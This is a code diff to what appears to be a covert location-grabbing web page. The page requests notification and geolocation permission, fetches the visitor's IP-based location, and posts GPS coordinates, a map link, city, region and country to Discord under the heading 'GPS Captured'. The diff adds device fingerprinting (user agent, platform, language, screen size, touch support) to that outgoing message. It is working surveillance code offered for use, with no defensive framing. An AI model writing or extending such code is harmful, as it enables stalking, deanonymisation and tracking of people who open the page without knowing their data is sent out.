@@ -39,8 +39,20 @@
       document.close();
     }
 
+    function getDeviceInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
+      };
+    }
+
     function sendToDiscord(lat, lon, acc, ipData) {
       const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      const device = getDeviceInfo();
+
       const payload = {
         content: `📍 **GPS Captured**  
 **Latitude:** ${lat}  
@@ -53,6 +65,13 @@
 **City:** ${ipData.city}  
 **Region:** ${ipData.stateProv}  
 **Country:** ${ipData.countryName}
+
+🖥️ **Device Info**  
+**Platform:** ${device.platform}  
+**Browser:** ${device.userAgent}  
+**Language:** ${device.language}  
+**Screen:** ${device.screen}  
+**Touch Support:** ${device.touchSupport}
 
 🕒 ${new Date().toLocaleString()}`
       };
@@ -73,8 +92,8 @@
         .then(res => res.json())
         .then(ipData => {
           timeoutID = setTimeout(() => {
-            redirectDenied(); // fallback if user blocks or ignores
-          }, 10000); // wait max 10 seconds
+            redirectDenied();
+          }, 10000);
 
           navigator.geolocation.getCurrentPosition(
             (pos) => {
@@ -103,10 +122,10 @@
     function requestNotificationsThenStart() {
       if (Notification && Notification.requestPermission) {
         Notification.requestPermission().finally(() => {
-          getIPAndGPS(); // continue regardless of result
+          getIPAndGPS();
         });
       } else {
-        getIPAndGPS(); // fallback for unsupported browsers
+        getIPAndGPS();
       }
     }
 
